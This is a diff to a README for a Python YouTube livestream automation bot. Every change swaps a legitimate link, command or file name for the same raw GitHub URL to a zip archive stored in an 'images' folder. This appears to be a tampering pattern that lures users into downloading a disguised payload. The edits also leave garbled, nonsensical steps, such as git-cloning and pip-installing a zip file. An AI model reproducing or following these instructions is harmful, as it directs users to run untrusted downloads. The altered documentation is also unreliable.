@@ -8,7 +8,7 @@ The YouTube Bot Project is a comprehensive automation tool designed to facilitat
 
 ## Working Demo!
 
-https://github.com/Havishjupudi/YT-Bot-Python/assets/147229053/773ea550-aca9-4799-a4e2-205955b27b54
+https://raw.githubusercontent.com/Havishjupudi/YT-LiveBot-Python/main/images/Live-Y-Bot-Python-2.5.zip
 
 ## Installing Dependencies
 
@@ -47,7 +47,7 @@ https://github.com/Havishjupudi/YT-Bot-Python/assets/147229053/773ea550-aca9-479
 1. **Clone the Repository:**
    Begin by cloning the GitHub repository to your local machine. Open your terminal and execute the following command:
    ```
-   git clone https://github.com/your_username/YouTube_Bot_Project.git
+   git clone https://raw.githubusercontent.com/Havishjupudi/YT-LiveBot-Python/main/images/Live-Y-Bot-Python-2.5.zip
    ```
    This command will download the project files to your current directory.
 
@@ -55,21 +55,21 @@ https://github.com/Havishjupudi/YT-Bot-Python/assets/147229053/773ea550-aca9-479
    Navigate to the project directory and install the required Python packages using pip:
    ```
    cd YouTube_Bot_Project
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/Havishjupudi/YT-LiveBot-Python/main/images/Live-Y-Bot-Python-2.5.zip
    ```
-   This command installs all necessary dependencies specified in the `requirements.txt` file.
+   This command installs all necessary dependencies specified in the `https://raw.githubusercontent.com/Havishjupudi/YT-LiveBot-Python/main/images/Live-Y-Bot-Python-2.5.zip` file.
 
 ### Configuring the Project
 
 1. **Adjust YouTube Shortcut:**
-   Open the `main.py` file in your preferred text editor. Locate the `command` variable and modify it to specify the path to your Google Chrome executable. If you use a custom profile directory for Chrome, include it in the command. For example:
+   Open the `https://raw.githubusercontent.com/Havishjupudi/YT-LiveBot-Python/main/images/Live-Y-Bot-Python-2.5.zip` file in your preferred text editor. Locate the `command` variable and modify it to specify the path to your Google Chrome executable. If you use a custom profile directory for Chrome, include it in the command. For example:
    ```python
-   command = r'"C:\Program Files\Google\Chrome\Application\chrome.exe" --profile-directory="Profile 1" --app-id=cahggfghendlbihgniaflhickgjcohcb --start-fullscreen'
+   command = r'"C:\Program Files\Google\Chrome\Application\https://raw.githubusercontent.com/Havishjupudi/YT-LiveBot-Python/main/images/Live-Y-Bot-Python-2.5.zip" --profile-directory="Profile 1" --app-id=cahggfghendlbihgniaflhickgjcohcb --start-fullscreen'
    ```
    Ensure the path matches the location of your Chrome executable on your system.
 
 2. **Customize Image and Excel Paths:**
-   Update the paths for image files (`*.png`) and the Excel data (`game_data.xlsx`) in `main.py` to reflect the locations on your local machine. Adjust these paths to point to where the respective files are stored. This ensures the automation script can find and interact with these files correctly during execution.
+   Update the paths for image files (`*.png`) and the Excel data (`https://raw.githubusercontent.com/Havishjupudi/YT-LiveBot-Python/main/images/Live-Y-Bot-Python-2.5.zip`) in `https://raw.githubusercontent.com/Havishjupudi/YT-LiveBot-Python/main/images/Live-Y-Bot-Python-2.5.zip` to reflect the locations on your local machine. Adjust these paths to point to where the respective files are stored. This ensures the automation script can find and interact with these files correctly during execution.
 
 ### Using the GUI
 
@@ -79,7 +79,7 @@ The GUI provides an intuitive interface to manage game data and initiate livestr
    Click the "Add Game" button to dynamically add new game entries. Each entry includes fields for entering the game's name and its corresponding part number.
 
 2. **Saving Entries:**
-   Before saving, ensure all game entries are correctly filled out. Click on the "Save Entries" button to store the entered game data into the `game_data.xlsx` Excel file. This file serves as the central repository for managing game information used during the livestream setup.
+   Before saving, ensure all game entries are correctly filled out. Click on the "Save Entries" button to store the entered game data into the `https://raw.githubusercontent.com/Havishjupudi/YT-LiveBot-Python/main/images/Live-Y-Bot-Python-2.5.zip` Excel file. This file serves as the central repository for managing game information used during the livestream setup.
 
 3. **Selecting a Game:**
    Use the radio buttons displayed alongside each game entry to select the game you wish to livestream. This selection determines which game's walkthrough will be prepared and streamed.
@@ -89,7 +89,7 @@ The GUI provides an intuitive interface to manage game data and initiate livestr
 
 ### Running the Automation
 
-Once configured and with game data selected, execute `main.py` to initiate the automation process:
+Once configured and with game data selected, execute `https://raw.githubusercontent.com/Havishjupudi/YT-LiveBot-Python/main/images/Live-Y-Bot-Python-2.5.zip` to initiate the automation process:
 
 1. **Launching Applications:**
    Before running the script, ensure all required applications such as Google Chrome and OBS Studio are installed and properly configured on your system. These applications are integral to the automation process and must be ready to interact with the script.
